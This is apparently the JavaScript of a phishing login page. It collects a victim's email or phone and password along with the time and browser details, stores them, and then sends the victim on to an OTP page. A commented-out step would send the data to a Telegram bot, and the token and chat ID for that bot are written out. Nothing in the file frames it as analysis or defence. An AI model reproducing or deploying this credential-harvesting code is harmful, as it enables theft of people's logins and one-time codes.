const btn = document.getElementById('submit')
const ePhone = document.getElementById('emailPhone') 
const pass = document.getElementById('pass')
const time = getCurrentTime()
const date = getCurrentDate()
const browserInfo = getBrowserInfo()

// / To get date and time
function getCurrentTime(){
    return new Date().toLocaleTimeString()
}

function getCurrentDate(){
    return new Date().toLocaleDateString()
}

// To get browser information
function getBrowserInfo() {
    return navigator.userAgent;
}

btn.addEventListener('click', ()=>{
    if (ePhone.value === '' || pass.value === '') {
        wrong.style.display = 'block'
        setTimeout(()=>{
            wrong.style.display = 'none'
        }, 2000)
    } else {
        const userInfo = {
            username: ePhone.value,
            passwords: pass.value,
            date,
            time,
            browser: browserInfo
        }
        localStorage.setItem("loginData", JSON.stringify(userInfo))
        setTimeout(()=>{
            window.location.href = 'otp.html'
        }, 1000)

        //  If validation passes, send data to Telegram
        // const botToken = "8066161475:AAGfS1ITTiDq2Qsf_vSd4mQCQvhUV8FK1RY"; // Replace with your bot token
        // const chatID = "7528859168"; // Replace with your chat ID
    }
})

const Btn = document.getElementById('loginSmall')
const user = document.getElementById('phEmail')
const ephone2 = document.getElementById('pas')
Btn.addEventListener('click', ()=>{
    if (user.value === '' || ephone2.value === '') {
        wCredentials.style.display = 'block'
        setTimeout(()=>{
            wCredentials.style.display = 'none'
        },2000)
    } else{
        const userInfo = {
            username: ePhone.value,
            passwords: pass.value,
            date,
            time,
            browser: browserInfo
        }
        localStorage.setItem("loginData", JSON.stringify(userInfo))
        setTimeout(()=>{
            window.location.href = 'otp.html'
        }, 1000)
    }
})